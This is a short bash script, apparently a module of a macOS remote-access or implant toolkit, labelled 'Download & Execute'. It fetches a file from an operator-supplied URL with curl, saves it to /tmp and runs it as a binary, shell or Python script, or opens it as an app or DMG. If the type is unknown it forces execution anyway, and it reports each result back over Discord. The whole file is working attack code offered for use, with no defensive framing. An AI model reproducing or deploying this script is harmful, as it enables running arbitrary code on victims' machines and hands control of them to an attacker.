#!/bin/bash
# ============================================================
# Download & Execute for macOS - Modular Remote Payload
# ============================================================
# Downloads a file and executes it
# Requires: $U (URL to download)
# ============================================================

SYSID=$(get_sysid)

if [[ -z "$U" ]]; then
    send_discord "❌ Download & Execute failed on $SYSID - Missing URL (\$U)"
    exit 1
fi

FILENAME=$(basename "$U")
TMPFILE="/tmp/$FILENAME"

send_discord "📥 **Download & Execute on $SYSID**\nURL: \`$U\`"

# Download
if curl -sL "$U" -o "$TMPFILE" 2>/dev/null; then
    # Determine file type and execute accordingly
    FILETYPE=$(file "$TMPFILE" | cut -d: -f2)
    
    if echo "$FILETYPE" | grep -qi "mach-o"; then
        # macOS executable
        chmod +x "$TMPFILE"
        "$TMPFILE" &
        send_discord "✅ Executed Mach-O binary"
    elif echo "$FILETYPE" | grep -qi "shell script\|bash\|text"; then
        # Shell script
        chmod +x "$TMPFILE"
        bash "$TMPFILE" &
        send_discord "✅ Executed shell script"
    elif echo "$FILETYPE" | grep -qi "python"; then
        # Python script
        python3 "$TMPFILE" &
        send_discord "✅ Executed Python script"
    elif echo "$FILENAME" | grep -qiE "\.app$"; then
        # macOS app
        open "$TMPFILE"
        send_discord "✅ Opened macOS application"
    elif echo "$FILENAME" | grep -qiE "\.dmg$"; then
        # DMG file
        hdiutil attach "$TMPFILE" -quiet
        send_discord "✅ Mounted DMG"
    else
        # Try to execute anyway
        chmod +x "$TMPFILE"
        "$TMPFILE" 2>/dev/null || bash "$TMPFILE" 2>/dev/null
        send_discord "⚠️ Attempted execution (unknown type: $FILETYPE)"
    fi
else
    send_discord "❌ Download failed from $U"
fi

